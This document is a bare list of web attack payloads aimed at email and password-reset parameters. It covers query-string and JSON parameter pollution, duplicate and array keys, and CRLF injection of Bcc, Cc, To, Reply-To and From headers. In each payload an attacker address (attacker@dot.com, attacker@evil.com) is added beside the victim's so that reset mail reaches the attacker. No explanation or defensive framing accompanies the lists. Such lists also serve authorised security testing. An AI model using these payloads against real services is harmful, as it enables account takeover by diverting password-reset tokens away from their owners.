# Payloads

### Query/Form-Based Parameter Payloads
```
email=user@dot.com&email=attacker@dot.com
email=user@dot.com%26email=attacker@dot.com
email=user@dot.com;email=attacker@dot.com
email[]=user@dot.com&email[]=attacker@dot.com
email=user@dot.com,attacker@dot.com
email=user@dot.com%2Cattacker@dot.com
email=user@dot.com%3Battacker@dot.com
email=user@dot.com%0Attacker@dot.com
email=user@dot.com%0D%0AAttacker@dot.com
email=user@dot.com%250Aattacker@dot.com
```

### JSON-Based Parameter Payloads
```
{"email": "user@dot.com", "email": "attacker@dot.com"}
{"email": ["user@dot.com", "attacker@dot.com"]}
{"email": ["user@dot.com"], "email": ["attacker@dot.com"]}
{"email": "user@dot.com,attacker@dot.com"}
{"emails": ["user@dot.com", "attacker@dot.com"]}
{"email[]": ["user@dot.com", "attacker@dot.com"]}
{"recipient": ["user@dot.com", "attacker@dot.com"]}
{"reset": {"email": ["user@dot.com", "attacker@dot.com"]}}
{"email": ["user@dot.com"], "bcc": ["attacker@dot.com"]}
{"email": ["user@dot.com"], "extra": ["attacker@dot.com"]}
```

### CRLF Injection in Email Headers
```
email=user@dot.com%0D%0ABcc:attacker@dot.com
email=user@dot.com%0ABcc:attacker@dot.com
email=user@dot.com%0DBcc:attacker@dot.com
email=user@dot.com%0D%0ATo:attacker@dot.com
email=user@dot.com%0D%0AInjected: yes
email=user@dot.com%0D%0ASubject: Reset Hijacked
email=user@dot.com%0D%0AReply-To: attacker@dot.com
email=user@dot.com%0D%0AFrom: attacker@dot.com
email=user@dot.com%0D%0AReturn-Path: attacker@dot.com
email=user@dot.com%0D%0ACc: attacker@dot.com
```

### Backslash-Encoded Variants
```
email=user@dot.com\rBcc:attacker@dot.com
email=user@dot.com\nBcc:attacker@dot.com
email=user@dot.com\r\nBcc:attacker@dot.com
email=user@dot.com\\r\\nBcc:attacker@dot.com
email=user@dot.com\\nBcc:attacker@dot.com
email=user@dot.com\\rBcc:attacker@dot.com
email=user@dot.com\r\nCc:attacker@dot.com
email=user@dot.com\r\nTo:attacker@dot.com
email=user@dot.com\r\nReply-To:attacker@dot.com
email=user@dot.com\r\nHeader-Injection: Success
```

### JSON Combined
```
// === PARAMETER MANIPULATION PAYLOADS ===

{"email": "victim@example.com,attacker@evil.com"}
{"email": "victim@example.com;attacker@evil.com"}
{"email": "victim@example.com%2Cattacker@evil.com"}
{"email": "victim@example.com%3Battacker@evil.com"}
{"email": "victim@example.com%0Attacker@evil.com"}
{"email": "victim@example.com%0D%0AAttacker@evil.com"}
{"email": "victim@example.com%250Aattacker@evil.com"}
{"email": "victim@example.com%0D%0Aattacker@evil.com"}
{"email": "victim@example.com%0D%0A%20attacker@evil.com"}
{"email": "victim@example.com%0D%0A%09attacker@evil.com"}

{"email": ["victim@example.com", "attacker@evil.com"]}
{"email": ["victim@example.com"], "email": ["attacker@evil.com"]}
{"email": ["victim@example.com"], "extra": ["attacker@evil.com"]}
{"emails": ["victim@example.com", "attacker@evil.com"]}
{"email_address": ["victim@example.com", "attacker@evil.com"]}
{"recipient": ["victim@example.com", "attacker@evil.com"]}

{"email": "victim@example.com", "email": "attacker@evil.com"}
{"email": "victim@example.com", "Email": "attacker@evil.com"}
{"email": "victim@example.com", "recipient": "attacker@evil.com"}
{"recipient": "victim@example.com", "bcc": "attacker@evil.com"}


// === CRLF INJECTION IN EMAIL HEADER ===

{"email": "victim@example.com%0D%0ABcc: attacker@evil.com"}
{"email": "victim@example.com%0D%0ACc: attacker@evil.com"}
{"email": "victim@example.com%0D%0ATo: attacker@evil.com"}
{"email": "victim@example.com%0D%0AFrom: attacker@evil.com"}
{"email": "victim@example.com%0D%0AReply-To: attacker@evil.com"}
{"email": "victim@example.com%0D%0AReturn-Path: attacker@evil.com"}
{"email": "victim@example.com%0D%0AX-Injected: yes"}
{"email": "victim@example.com%0D%0ASubject: Hacked"}
{"email": "victim@example.com%0D%0A\r\nBcc: attacker@evil.com"}
{"email": "victim@example.com%0D%0A\nBcc: attacker@evil.com"}

{"email": "victim@example.com\r\nBcc: attacker@evil.com"}
{"email": "victim@example.com\nBcc: attacker@evil.com"}
{"email": "victim@example.com\rBcc: attacker@evil.com"}
{"email": "victim@example.com\r\nX-Test: 1"}
{"email": "victim@example.com\r\nContent-Type: text/html"}

{"email": ["victim@example.com\r\nBcc: attacker@evil.com"]}
{"email": ["victim@example.com\nBcc: attacker@evil.com"]}
{"email": ["victim@example.com%0D%0ABcc: attacker@evil.com"]}

{"email": "victim@example.com%250D%250ABcc: attacker@evil.com"}
{"email": "victim@example.com%0D%0A%20Bcc:%20attacker@evil.com"}
```
